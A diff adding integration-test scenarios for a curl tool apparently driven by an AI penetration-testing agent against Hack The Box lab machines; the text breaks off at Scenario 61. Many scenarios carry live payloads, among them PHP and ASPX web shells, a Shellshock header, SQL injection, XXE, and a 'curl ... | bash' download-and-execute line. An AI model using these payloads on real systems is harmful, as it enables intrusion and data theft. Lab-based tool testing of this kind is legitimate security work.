@@ -1,0 +1,825 @@
+# Integration Scenarios: curl
+# Required HTB Machine: ANY web-facing box (curl is used on every engagement with HTTP)
+# Recommended FIRST box: Bashed (easy Linux, /dev/phpbash.php gives immediate RCE
+#   via inject, simple file upload paths, exercises request/inject/download_to_file)
+# Alternative boxes by focus area:
+#   - Shocker: Shellshock via header injection (inject with custom headers)
+#   - Nibbles: File upload exploitation (upload method)
+#   - Bank: Directory traversal + credential discovery (download/download_to_file)
+#   - Hercules: Path traversal + ASPX upload + raw_response binary download
+#   - DevArea: JSON API + JWT auth + SOAP/XML + FTP download
+#   - Cobblestone: Form POST + SQL injection via body + no-redirect + vhost routing
+#   - Kobold: POST inject with JSON body + encoding=none + insecure TLS
+# Prerequisites: Target reachable on VPN, web server running on any port
+# Run with: pytest tests/tools/test_curl.py -m integration --tool=curl \
+#           --target=<IP> -v
+#
+# Data source: Trajectory analysis of 1,332 real curl calls across 25+ HTB engagements.
+#   Method distribution: request=970, inject=282, download_to_file=64, upload=13, download=3
+#   request breakdown: GET=601, POST=362, HEAD=4, PUT=2, OPTIONS=1
+#   request features: custom_headers=460, insecure=425, with_body=362, cookie=151,
+#     no_redirect=65, auth=26, debug=37 (level1=23, level2=10, level3=4),
+#     raw_response=5, custom_ua=0 (all used default)
+#   inject breakdown: GET=279, POST=3, encoding_url=279, encoding_none=3,
+#     with_headers=73, with_cookie=0, with_body=3
+#   inject command types: cat_file=100, ls=80, other=77, script_exec=13,
+#     cat_passwd=6, download_exec=3, id=3
+#   upload breakdown: 13 calls, extensions=odt(4)/jpg(3)/aspx(2)/xlsx(1)/docx(1)/dll(1)/phtml(1),
+#     all had extra_fields, all had cookie, 8 used is_base64
+#   download_to_file: 64 calls, includes FTP URLs, GitHub SecLists, HTB artifacts
+#   download: 3 calls (rarely used; agents prefer download_to_file)
+#   Error rate: <0.1% (1 unknown error out of 1,332 calls)
+#   Header patterns: Content-Type=344, Host=137, Authorization=30, Accept=20,
+#     Referer=14, SOAPAction=5, Cookie=5, X-API-Key=1, X-Original-URL=1,
+#     X-Forwarded-For=1, X-CSRFToken=1
+
+# ===============================================================================
+# BASIC REQUEST SCENARIOS (request method)
+# ===============================================================================
+
+## Scenario 1: Simple GET request (the most common pattern - 601 GET calls)
+Method: request
+Args: {url: "http://<IP>/"}
+Expected: success=true, status_code=200, body contains HTML, timing.total_ms > 0,
+  timing.dns_lookup_ms >= 0, timing.remote_ip matches <IP>
+Notes: Basic connectivity test. Every engagement starts here. Verify response
+  headers (Server, X-Powered-By, Set-Cookie) and timing data. The default
+  User-Agent is "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+  which blends with normal browser traffic. Body is capped at 50,000 chars.
+
+## Scenario 2: GET with custom headers - Host header vhost routing (137 Host headers)
+Method: request
+Args: {url: "http://<IP>/", headers: {"Host": "target.htb"}}
+Expected: success=true, response may differ from Scenario 1 (different vhost content)
+Notes: Virtual host routing is the #1 use of custom headers in real engagements.
+  137 calls used Host header to reach vhosts (e.g., deploy.cobblestone.htb,
+  mcp.kobold.htb). Often the default vhost returns a redirect or placeholder
+  while the named vhost returns the actual application.
+
+## Scenario 3: GET with multiple custom headers for recon
+Method: request
+Args: {url: "http://<IP>/", headers: {"Host": "target.htb", "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "Accept": "text/html"}}
+Expected: success=true, status_code present
+Notes: Tests combined header injection. X-Forwarded-For and X-Real-IP may bypass
+  IP-based access controls. Real data shows Accept used 20 times, X-Forwarded-For
+  and X-Real-IP used for ACL bypass testing.
+
+## Scenario 4: POST with form-urlencoded data (362 POST calls, dominant pattern)
+Method: request
+Args: {url: "http://<IP>/login.php", method: "POST", data: "username=admin&password=test", headers: {"Content-Type": "application/x-www-form-urlencoded"}}
+Expected: success=true, status_code present, body contains login response
+Notes: Form POST is the most common POST pattern. Content-Type header was used in
+  344 calls (overwhelmingly for POST). Real examples include login forms, search
+  forms, and SQL injection payloads in form data.
+
+## Scenario 5: POST with JSON body (common API pattern)
+Method: request
+Args: {url: "http://<IP>/api/login", method: "POST", data: "{\"username\": \"admin\", \"password\": \"test\"}", headers: {"Content-Type": "application/json"}}
+Expected: success=true, body contains JSON response
+Notes: JSON APIs are heavily used in modern HTB boxes. Real examples:
+  token-auth endpoints, middleware configuration, MCP API exploitation.
+  The body/data alias both work identically.
+
+## Scenario 6: POST with JSON body using 'body' alias
+Method: request
+Args: {url: "http://<IP>/api/auth", method: "POST", body: "{\"username\": \"admin\", \"password\": \"test\"}", headers: {"Content-Type": "application/json"}}
+Expected: success=true, identical behavior to using 'data' parameter
+Notes: The 'body' parameter is an alias for 'data'. Both are accepted. The server
+  uses body if provided, falls back to data. Test both to ensure parity.
+
+## Scenario 7: HEAD request for server fingerprinting (4 real HEAD calls)
+Method: request
+Args: {url: "http://<IP>/", method: "HEAD"}
+Expected: success=true, headers contain Server/X-Powered-By, body="" (empty)
+Notes: Fingerprint web server version without downloading body. Real usage:
+  checking if uploaded files exist (HEAD on uploaded file URL to verify presence
+  before attempting execution). Status 200 = file exists, 404 = upload failed.
+
+## Scenario 8: OPTIONS request for method discovery (1 real call)
+Method: request
+Args: {url: "http://<IP>/", method: "OPTIONS"}
+Expected: success=true, headers contain Allow with supported methods
+Notes: Discover allowed HTTP methods. Look for PUT/DELETE which may allow
+  direct file upload or resource deletion. Rarely used in practice but
+  critical when found (PUT on WebDAV = file upload without form).
+
+## Scenario 9: PUT request for WebDAV or API updates (2 real PUT calls)
+Method: request
+Args: {url: "http://<IP>/api/v2/config", method: "PUT", data: "{\"binary\": \"/bin/bash\", \"script\": \"#!/bin/bash\\nid\"}", headers: {"Content-Type": "application/json", "Authorization": "Bearer <token>"}}
+Expected: success=true, status_code 200/201/204
+Notes: PUT used for API modifications after auth. Real example: updating
+  HoverFly middleware configuration with reverse shell payload. Always
+  requires authentication (Bearer token or session cookie).
+
+## Scenario 10: Request with cookies for session hijacking (151 cookie calls)
+Method: request
+Args: {url: "http://<IP>/admin/", cookie: "PHPSESSID=abc123; admin=true"}
+Expected: success=true (may be 401/403), response captured
+Notes: Cookie injection is the 4th most used feature (151 calls). Used for
+  session fixation, privilege escalation (admin=true cookie), and maintaining
+  authenticated sessions across multiple requests. All 13 upload calls also
+  used cookies for authenticated uploads.
+
+## Scenario 11: Request with Bearer token authorization (30 Authorization headers)
+Method: request
+Args: {url: "http://<IP>/api/users", headers: {"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.rTCH8cLoGxAm_xw68z-zXVKi9ie6xJn9tnVWjd_9ftE"}}
+Expected: success=true, response from authenticated API endpoint
+Notes: Bearer token auth was the 3rd most used header (30 calls). Real
+  engagements used JWT tokens obtained from auth endpoints. Test with both
+  valid and invalid/expired tokens to verify error handling.
+
+## Scenario 12: Request with Basic auth (26 auth param calls)
+Method: request
+Args: {url: "http://<IP>/admin/", auth: "admin:password123"}
+Expected: status_code 200 or 401, captured response
+Notes: The auth parameter adds HTTP Basic Authentication. 26 real calls.
+  Used for services like Tomcat manager, Jenkins, basic-auth-protected
+  admin panels. Check for 401 vs 200 to confirm valid credentials.
+
+## Scenario 13: Request with no-redirect to see redirect chain (65 calls)
+Method: request
+Args: {url: "http://<IP>/admin/", follow_redirects: false}
+Expected: success=true, status_code=301/302/303/307, headers contain location
+Notes: Disabling redirects is critical for login flow analysis. 65 real calls
+  used follow_redirects=false. Reveals: redirect targets after login, session
+  cookie set on redirect response, SSRF redirect chains. The Location header
+  shows where the server wants to redirect. Default is follow_redirects=true
+  with max 10 redirects.
+
+## Scenario 14: HTTPS request with insecure flag (425 insecure calls)
+Method: request
+Args: {url: "https://<IP>/", insecure: true}
+Expected: success=true, response captured despite self-signed cert
+Notes: insecure=true was used in 425 calls (32% of all requests). HTB boxes
+  almost always use self-signed certificates. Without this flag, HTTPS
+  requests fail with ssl_certificate_error. This is the #3 most used feature.
+
+## Scenario 15: Request with debug level 1 (23 real calls)
+Method: request
+Args: {url: "http://<IP>/", debug_level: 1}
+Expected: success=true, response.debug.request_headers contains sent headers
+Notes: Debug level 1 adds -v flag and parses request headers from stderr.
+  Useful for verifying exactly what headers curl sent. Real usage: 23 calls
+  at level 1, 10 at level 2, 4 at level 3. Used when responses are unexpected
+  and the agent needs to verify the actual wire format.
+
+## Scenario 16: Request with debug level 2 (verbose output)
+Method: request
+Args: {url: "http://<IP>/", debug_level: 2}
+Expected: success=true, response.debug.verbose_output contains full curl -v output
+Notes: Level 2 includes the full verbose output (TLS handshake, connection
+  details, header exchange). Capped at 10,000 chars. Useful for diagnosing
+  TLS issues, proxy problems, or connection failures.
+
+## Scenario 17: Request with debug level 3 (full trace)
+Method: request
+Args: {url: "http://<IP>/", debug_level: 3}
+Expected: success=true, response.debug.verbose_output contains trace-level detail
+Notes: Maximum verbosity. 4 real calls. Used for deeply troublesome connections
+  where level 2 was insufficient. Includes binary data representation.
+
+## Scenario 18: Request with raw_response for binary content (5 real calls)
+Method: request
+Args: {url: "https://<IP>/Home/Download?fileName=../../bin/target.dll", method: "GET", raw_response: true, insecure: true}
+Expected: success=true, response.body_base64 contains base64-encoded binary,
+  body_length > 0
+Notes: raw_response=true captures binary data as base64. Real usage: downloading
+  .dll, .pdb, .cshtml files via path traversal on Hercules HTB. The body field
+  still contains the UTF-8 decoded version (may be garbled for binary). Use
+  body_base64 for accurate binary content.
+
+## Scenario 19: POST with SQL injection payload in form body
+Method: request
+Args: {url: "http://<IP>/search.php", method: "POST", data: "url=' UNION ALL SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL,NULL FROM users-- -", headers: {"Content-Type": "application/x-www-form-urlencoded"}}
+Expected: success=true, body may contain extracted database content
+Notes: Real pattern from Cobblestone HTB. SQL injection via POST form data.
+  The curl tool sends the payload as-is in the body. The agent handles SQL
+  syntax construction; curl is just the transport. Also seen: LOAD_FILE()
+  for reading server files via SQL injection.
+
+## Scenario 20: POST with XML/SOAP body (5 SOAPAction calls)
+Method: request
+Args: {url: "http://<IP>/employeeservice", method: "POST", data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:dev=\"http://target.htb/\">\n  <soapenv:Header/>\n  <soapenv:Body>\n    <dev:getVersion/>\n  </soapenv:Body>\n</soapenv:Envelope>", headers: {"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": "\"\""}}
+Expected: success=true, body contains SOAP response XML
+Notes: SOAP/XML exploitation from DevArea HTB. 5 calls with SOAPAction header.
+  Content-Type must be text/xml. Real payloads included XOP (XML-binary Optimized
+  Packaging) multipart for file read via XXE. The SOAPAction header is often
+  empty ("") but required for the server to process the request.
+
+## Scenario 21: POST with multipart SOAP/XOP body (XXE via MTOM)
+Method: request
+Args: {url: "http://<IP>/employeeservice", method: "POST", data: "------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type=\"text/xml\"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><submitReport/></soap:Body></soap:Envelope>\r\n------=_Part_1--", headers: {"Content-Type": "multipart/related; type=\"application/xop+xml\"; start=\"<root.message@cxf.apache.org>\"; boundary=\"----=_Part_1\"", "SOAPAction": "\"\""}}
+Expected: success=true, response from SOAP endpoint
+Notes: Advanced SOAP exploitation using MTOM/XOP for XXE attacks. Real pattern
+  from DevArea HTB with multiple parts. The multipart boundary must match between
+  Content-Type header and body delimiters exactly.
+
+## Scenario 22: Request with CSRF token header
+Method: request
+Args: {url: "http://<IP>/api/settings", method: "POST", data: "{\"key\": \"value\"}", headers: {"Content-Type": "application/json", "X-CSRFToken": "<token>", "Referer": "http://<IP>/"}, cookie: "session=<sid>; csrftoken=<token>"}
+Expected: success=true, CSRF-protected endpoint accepts request
+Notes: Referer header used 14 times in real data. CSRF tokens seen in both
+  headers (X-CSRFToken, X-pgA-CSRFToken) and cookies. The Referer must match
+  the expected origin or the server may reject the request.
+
+## Scenario 23: Request with X-Original-URL / X-Rewrite-URL bypass
+Method: request
+Args: {url: "http://<IP>/allowed-path", headers: {"X-Original-URL": "/admin/panel", "X-Rewrite-URL": "/admin/panel"}}
+Expected: success=true, may return admin panel content despite requesting allowed path
+Notes: URL rewrite header bypass for WAF/reverse proxy. Both X-Original-URL and
+  X-Rewrite-URL were used in real engagements (1 call each). The proxy sees the
+  allowed URL but forwards X-Original-URL to the backend, bypassing path-based
+  access controls.
+
+## Scenario 24: Request with high timeout for slow targets
+Method: request
+Args: {url: "http://<IP>/slow-endpoint", timeout: 120, connect_timeout: 30}
+Expected: success=true, timing.total_ms may be high
+Notes: 2 real calls used timeout > 60s. Default is 30s request / 10s connect.
+  Slow endpoints include: heavy database queries, file processing, deliberately
+  slow pages (tar pit). connect_timeout is separate from request timeout.
+
+## Scenario 25: PATCH request for partial API updates
+Method: request
+Args: {url: "http://<IP>/api/users/1", method: "PATCH", data: "{\"role\": \"admin\"}", headers: {"Content-Type": "application/json", "Authorization": "Bearer <token>"}}
+Expected: success=true, user role updated
+Notes: PATCH supported in method enum but 0 real calls observed. Include for
+  coverage since APIs often expose PATCH for partial resource updates, which
+  is a common privilege escalation vector.
+
+## Scenario 26: DELETE request for resource removal
+Method: request
+Args: {url: "http://<IP>/api/users/2", method: "DELETE", headers: {"Authorization": "Bearer <token>"}}
+Expected: success=true, status_code=200/204
+Notes: DELETE supported in method enum but 0 real calls observed. Include for
+  coverage. May be used to delete security rules, user accounts, or log entries.
+
+# ===============================================================================
+# RCE INJECTION SCENARIOS (inject method)
+# ===============================================================================
+
+## Scenario 27: Command injection via GET - URL encoding (279 GET + 279 url-encoded)
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "url"}
+Expected: success=true, output contains "uid="
+Notes: The dominant injection pattern. 279 of 282 inject calls used GET with
+  url encoding. {PAYLOAD} is replaced with url_quote(command). The output is
+  auto-extracted: HTML tags stripped, entities decoded, whitespace normalized.
+  Verify extracted_output is clean (no HTML artifacts).
+
+## Scenario 28: Inject with file read command (100 cat_file calls - most common)
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "cat /etc/passwd", encoding: "url"}
+Expected: success=true, output contains "root:x:0:0:"
+Notes: File reading was the #1 inject command type (100 calls). Common targets:
+  /etc/passwd, /etc/shadow, config files, application source code, SSH keys.
+  The URL encoding handles spaces and special chars in the command.
+
+## Scenario 29: Inject with directory listing (80 ls calls - 2nd most common)
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "ls -la /var/www/html/", encoding: "url"}
+Expected: success=true, output contains directory listing
+Notes: Directory listing was the #2 command type (80 calls). Used for
+  enumeration after gaining RCE: finding config files, uploaded content,
+  writable directories, suid binaries.
+
+## Scenario 30: Inject with complex piped commands (77 "other" commands)
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "ps aux | grep -v '\\[' | head -40", encoding: "url"}
+Expected: success=true, output contains process list
+Notes: Complex piped commands were common (77 calls). Real examples from
+  engagement data: "find / -name user.txt 2>/dev/null", "ps aux | grep target",
+  "grep -r password /etc/ 2>/dev/null | tail -5". Pipes, redirects, and
+  semicolons all work within the command parameter.
+
+## Scenario 31: Inject with find command for flag discovery
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "find / -name user.txt 2>/dev/null; find / -name root.txt 2>/dev/null", encoding: "url"}
+Expected: success=true, output contains file paths
+Notes: Real pattern from engagement data. Semicolons chain commands.
+  stderr redirect (2>/dev/null) suppresses permission denied noise.
+
+## Scenario 32: Inject with process monitoring (loop commands)
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "for i in 1 2 3 4 5; do ps aux | grep target | grep -v grep; sleep 2; done", encoding: "url"}
+Expected: success=true, output contains multiple snapshots of process list
+Notes: Real pattern: monitoring cron jobs or intermittent processes. The sleep
+  and loop run server-side. Timeout should be generous (30s default is fine
+  for short loops, increase for longer monitoring).
+
+## Scenario 33: Inject with script execution (13 script_exec calls)
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "python3 -c 'import os; os.system(\"id\")'", encoding: "url"}
+Expected: success=true, output contains uid
+Notes: Script execution via python/php/perl was used 13 times. Real examples:
+  fontforge Python scripting, PHP one-liners for file operations. URL encoding
+  handles quotes and special characters correctly.
+
+## Scenario 34: Inject with download+execute pattern (3 download_exec calls)
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "curl http://10.10.16.50:8000/linpeas.sh | bash", encoding: "url"}
+Expected: success=true, output from executed script
+Notes: Download and execute in one command. 3 real calls. Used to deploy
+  enumeration scripts or reverse shells. The nested curl within the command
+  is URL-encoded as part of the payload.
+
+## Scenario 35: Inject via POST body with {PAYLOAD} placeholder (3 real POST inject calls)
+Method: inject
+Args: {url: "http://<IP>/api/exec", command: "id", method: "POST", data: "{\"serverConfig\": {\"command\": \"bash\", \"args\": [\"-c\", \"{PAYLOAD}\"], \"env\": {}}, \"serverId\": \"exploit\"}", encoding: "none"}
+Expected: success=true, output contains uid
+Notes: POST injection with JSON body. Real pattern from Kobold HTB. The
+  {PAYLOAD} placeholder in the data/body field is replaced with the encoded
+  command. encoding=none used because the command is embedded in JSON (which
+  handles its own escaping). All 3 POST inject calls used encoding=none.
+
+## Scenario 36: Inject with encoding=none for pre-formatted payloads (3 real calls)
+Method: inject
+Args: {url: "http://<IP>/api/endpoint", command: "cat /etc/hostname", method: "POST", body: "{\"cmd\": \"{PAYLOAD}\"}", encoding: "none"}
+Expected: success=true, output contains hostname
+Notes: encoding=none sends the command as-is without URL/base64 encoding.
+  Used when the payload is embedded in structured data (JSON, XML) where
+  additional encoding would break the structure. All 3 real uses were POST+JSON.
+
+## Scenario 37: Inject with base64 encoding for WAF bypass
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "base64"}
+Expected: success=true, command sent as base64 (e.g., "aWQ=")
+Notes: 0 real calls with base64 encoding, but the capability exists and is
+  important for WAF bypass. The server must decode: e.g., the vulnerable
+  endpoint runs `echo {PAYLOAD} | base64 -d | bash`. Include for coverage
+  since WAF evasion scenarios require this.
+
+## Scenario 38: Inject with double-URL encoding for WAF bypass
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "double-url"}
+Expected: success=true, command double-URL-encoded
+Notes: 0 real calls, but critical for IDS/WAF evasion. Double encoding
+  bypasses single-decode WAFs: the first URL decode by the WAF produces
+  still-encoded text, and the second decode by the backend recovers the
+  command. Example: space becomes %2520 instead of %20.
+
+## Scenario 39: Inject with output markers for clean extraction
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "whoami", output_markers: {start: "<!--START-->", end: "<!--END-->"}}
+Expected: success=true, extracted_output is clean (no HTML surrounding content)
+Notes: 0 real calls used output_markers (agents relied on strip_html instead).
+  Useful when the vulnerable page embeds output between known markers. The
+  markers support start-only, end-only, or both. Regex extraction with re.DOTALL
+  handles multiline output.
+
+## Scenario 40: Inject with strip_html=false for raw output
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "cat /var/www/html/index.php", encoding: "url", strip_html: false}
+Expected: success=true, output contains raw HTML/PHP source
+Notes: Default strip_html=true removes HTML tags. Set to false when the
+  command output IS HTML/PHP source code that you need to read. Without this,
+  PHP tags and HTML structure would be stripped from file contents.
+
+## Scenario 41: Inject with custom headers (73 inject calls with headers)
+Method: inject
+Args: {url: "http://<IP>/cgi-bin/vuln.sh", command: "id", headers: {"User-Agent": "() { :; }; echo; echo; /bin/bash -c '{PAYLOAD}'"}, encoding: "none"}
+Expected: success=true, output contains uid (Shellshock via User-Agent)
+Notes: 73 inject calls used custom headers. The most notable pattern is
+  Shellshock exploitation where the payload is in the User-Agent header
+  instead of the URL. {PAYLOAD} in header values is also replaced. Real
+  engagement data shows heavy header customization for inject calls.
+
+## Scenario 42: Inject with cookie-based session
+Method: inject
+Args: {url: "http://<IP>/admin/exec.php?cmd={PAYLOAD}", command: "id", cookie: "PHPSESSID=valid_session_id"}
+Expected: success=true, authenticated RCE
+Notes: Authenticated command injection after login. The cookie maintains
+  the session that grants access to the vulnerable endpoint. Without it,
+  the endpoint would redirect to login or return 403.
+
+## Scenario 43: Inject with HTTPS and insecure flag
+Method: inject
+Args: {url: "https://<IP>/api/exec?cmd={PAYLOAD}", command: "id", encoding: "url", insecure: true}
+Expected: success=true, output contains uid
+Notes: Many HTB boxes serve RCE endpoints over HTTPS with self-signed certs.
+  insecure=true is required. The inject method passes insecure through to
+  the underlying request call.
+
+## Scenario 44: Inject with debug for troubleshooting failed RCE
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "id", encoding: "url", debug_level: 2}
+Expected: success=true, response includes debug.verbose_output alongside extracted output
+Notes: When RCE appears to fail (empty output, wrong status), debug_level
+  reveals the actual request sent and response received. The inject response
+  includes both extracted command output and debug info from the underlying
+  request.
+
+## Scenario 45: Inject with elevated timeout for long-running commands
+Method: inject
+Args: {url: "http://<IP>/vuln.php?cmd={PAYLOAD}", command: "find / -perm -4000 -type f 2>/dev/null", encoding: "url", timeout: 90}
+Expected: success=true, output contains SUID binaries
+Notes: Some enumeration commands (find across entire filesystem, large grep)
+  take longer than the 30s default. Real data: 2 calls used timeout=90/120.
+  Increase for slow commands or targets behind latent networks.
+
+# ===============================================================================
+# FILE UPLOAD SCENARIOS (upload method)
+# ===============================================================================
+
+## Scenario 46: Upload PHP web shell (classic pattern)
+Method: upload
+Args: {url: "http://<IP>/upload.php", file_field: "file", filename: "shell.php", content: "<?php system($_GET['c']); ?>", content_type: "application/x-php"}
+Expected: success=true, response indicates upload succeeded, filename in response,
+  file_size > 0
+Notes: Classic web shell upload. The server writes content to a temp file and
+  uses curl -F for multipart upload. Verify the shell is accessible by
+  following up with a request to the expected upload path.
+
+## Scenario 47: Upload ASPX web shell (2 real .aspx uploads)
+Method: upload
+Args: {url: "https://<IP>/Home/Forms", file_field: "UploadedFile", filename: "shell.aspx", content: "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\nvoid Page_Load(object s, EventArgs e) {\n  Process p = new Process();\n  p.StartInfo.FileName = \"cmd.exe\";\n  p.StartInfo.Arguments = \"/c \" + Request[\"c\"];\n  p.StartInfo.UseShellExecute = false;\n  p.StartInfo.RedirectStandardOutput = true;\n  p.Start();\n  Response.Write(p.StandardOutput.ReadToEnd());\n}\n</script>", content_type: "application/octet-stream", extra_fields: {"Name": "Test", "Email": "test@test.com", "Description": "report"}, cookie: "session=<sid>", insecure: true}
+Expected: success=true, upload accepted
+Notes: Real pattern from Hercules HTB. ASPX uploads for .NET targets. Always
+  needs authenticated session (cookie). extra_fields are critical - the form
+  expects additional POST fields or returns 400. All 13 real uploads used
+  extra_fields and cookie.
+
+## Scenario 48: Upload with double extension bypass (filter evasion)
+Method: upload
+Args: {url: "http://<IP>/upload.php", file_field: "avatar", filename: "shell.php.jpg", content: "<?php system($_GET['c']); ?>", content_type: "image/jpeg"}
+Expected: success=true, upload accepted despite PHP content
+Notes: Extension filter bypass using double extension. The server checks the
+  last extension (.jpg = allowed) but Apache/Nginx may execute based on the
+  first (.php). Also try: shell.phtml (1 real phtml upload), shell.php5,
+  shell.php7, shell.phar.
+
+## Scenario 49: Upload with base64-encoded binary content (8 real base64 uploads)
+Method: upload
+Args: {url: "https://<IP>/Home/Forms", file_field: "UploadedFile", filename: "report.odt", content: "UEsDBBQAAAAIAA...(base64 data)...", content_type: "application/vnd.oasis.opendocument.text", is_base64: true, extra_fields: {"Name": "Test", "Email": "test@test.com", "Description": "report", "__RequestVerificationToken": "<token>"}, cookie: "session=<sid>", insecure: true}
+Expected: success=true, file_size matches decoded content length
+Notes: 8 of 13 uploads used is_base64=true for binary files. Real extensions:
+  .odt(4), .xlsx(1), .docx(1), .dll(1). Binary content cannot be sent as
+  plain text without corruption. The server decodes base64 before writing
+  to temp file for curl upload. __RequestVerificationToken is an ASP.NET
+  anti-forgery token scraped from the form page.
+
+## Scenario 50: Upload DLL for code execution (1 real .dll upload)
+Method: upload
+Args: {url: "https://<IP>/Home/Forms", file_field: "UploadedFile", filename: "exploit.dll", content: "<base64 PE binary>", content_type: "application/octet-stream", is_base64: true, extra_fields: {"Name": "Test", "Email": "test@test.com", "Description": "library"}, cookie: "session=<sid>", insecure: true}
+Expected: success=true, DLL uploaded for sideloading or execution
+Notes: Real pattern from Hercules HTB. DLL uploads for .NET DLL injection
+  or sideloading attacks. Content must be valid PE format (base64-encoded).
+
+## Scenario 51: Upload image with embedded payload (3 real .jpg uploads)
+Method: upload
+Args: {url: "https://<IP>/upload", file_field: "UploadedFile", filename: "photo.jpg", content: "<base64 of JPG with PHP in EXIF/comment>", content_type: "image/jpeg", is_base64: true, extra_fields: {"Name": "Photo"}, cookie: "session=<sid>"}
+Expected: success=true, image accepted
+Notes: 3 real .jpg uploads. Images can contain PHP code in EXIF metadata or
+  appended after valid image data. If the server includes the file with a
+  PHP handler, the embedded code executes. Pair with local file inclusion.
+
+## Scenario 52: Upload Office document with macro payload (odt/docx/xlsx)
+Method: upload
+Args: {url: "https://<IP>/Home/Forms", file_field: "UploadedFile", filename: "report.docx", content: "<base64 of malicious docx>", content_type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", is_base64: true, extra_fields: {"Name": "Report", "Email": "test@test.com", "Description": "quarterly report"}, cookie: "session=<sid>", insecure: true}
+Expected: success=true, document uploaded for server-side processing
+Notes: Real patterns: .odt(4), .docx(1), .xlsx(1). Server-side document
+  processing may trigger macro execution, XXE via docx XML, or SSRF via
+  OLE links. The content_type must match the expected MIME for the extension.
+
+## Scenario 53: Upload with debug to troubleshoot failures
+Method: upload
+Args: {url: "http://<IP>/upload.php", file_field: "file", filename: "test.txt", content: "test content", content_type: "text/plain", debug_level: 2}
+Expected: success=true, response includes debug.verbose_output showing multipart boundary
+Notes: When uploads fail silently (200 but no file), debug_level reveals the
+  exact multipart form data sent. Verify: correct boundary, correct field name,
+  correct Content-Disposition filename. The upload method always uses POST.
+
+# ===============================================================================
+# FILE DOWNLOAD SCENARIOS (download method)
+# ===============================================================================
+
+## Scenario 54: Download small file to memory (3 real download calls)
+Method: download
+Args: {url: "http://<IP>/robots.txt"}
+Expected: success=true, content_base64 contains base64-encoded content,
+  size_bytes > 0, filename="robots.txt"
+Notes: The download method returns file content as base64. Only 3 real calls
+  because agents prefer download_to_file for most scenarios. Best for small
+  files (< few KB) where you need the content in the response. Real examples:
+  openapi.json, .dll, .pdb files.
+
+## Scenario 55: Download binary file to memory
+Method: download
+Args: {url: "https://<IP>/Home/Download?fileName=../../bin/target.dll", insecure: true}
+Expected: success=true, content_base64 contains PE binary as base64, size_bytes > 0
+Notes: Real pattern from Hercules HTB. Path traversal to download .dll for
+  reverse engineering. The base64 content can be decoded and analyzed offline.
+  For large binaries (> 10MB), prefer download_to_file to avoid memory issues.
+
+## Scenario 56: Download with connection failure handling
+Method: download
+Args: {url: "http://<IP>:9999/nonexistent"}
+Expected: success=false, error contains descriptive message, error_class set,
+  retryable flag indicates if retry makes sense
+Notes: Tests error handling for download method. Expected errors: connection_refused
+  (port closed), could_not_resolve_host (bad hostname), timeout (target slow).
+  The download method has separate error handling from request (no timing data,
+  simpler error response).
+
+# ===============================================================================
+# FILE DOWNLOAD-TO-DISK SCENARIOS (download_to_file method)
+# ===============================================================================
+
+## Scenario 57: Download artifact to session directory (dominant pattern - 64 calls)
+Method: download_to_file
+Args: {url: "http://<IP>/backup.zip", output_path: "/session/artifacts/backup.zip", timeout: 120}
+Expected: success=true, output_path set, size_bytes > 0, size_mb present
+Notes: The primary download method (64 calls vs 3 for download). Files are
+  saved directly to disk without base64 encoding. Real paths always start
+  with /session/ (artifacts/, wordlists/, downloads/). Parent directories
+  are auto-created if missing.
+
+## Scenario 58: Download from FTP URL (1 real FTP call)
+Method: download_to_file
+Args: {url: "ftp://anonymous:anonymous@<IP>/pub/target.jar", output_path: "/session/artifacts/target.jar"}
+Expected: success=true, file downloaded from FTP server
+Notes: curl supports FTP natively. Real example: downloading .jar from FTP
+  anonymous access on DevArea HTB. Credentials are embedded in the URL.
+  curl -L follows FTP redirects. Same timeout behavior as HTTP.
+
+## Scenario 59: Download wordlist from GitHub SecLists
+Method: download_to_file
+Args: {url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt", output_path: "/session/wordlists/10k-common.txt", timeout: 60}
+Expected: success=true, line_count > 0 (auto-counted for .txt files),
+  size_bytes > 0
+Notes: Real pattern: downloading SecLists for brute-force attacks. 3+ real
+  calls to GitHub raw URLs for password lists and username lists. The
+  line_count field is auto-populated for .txt files only.
+
+## Scenario 60: Download large wordlist with generous timeout
+Method: download_to_file
+Args: {url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-common.txt", output_path: "/session/wordlists/100k-common.txt", timeout: 300}
+Expected: success=true, size_bytes > 500000, line_count > 90000
+Notes: Large file download. Default timeout is 600s (10 min). The download
+  uses --progress-bar for progress indication. For very large files (rockyou.txt
+  at 130MB), the full 600s default may be needed.
+
+## Scenario 61: Download gzip-compressed file with auto-decompression
+Method: download_to_file
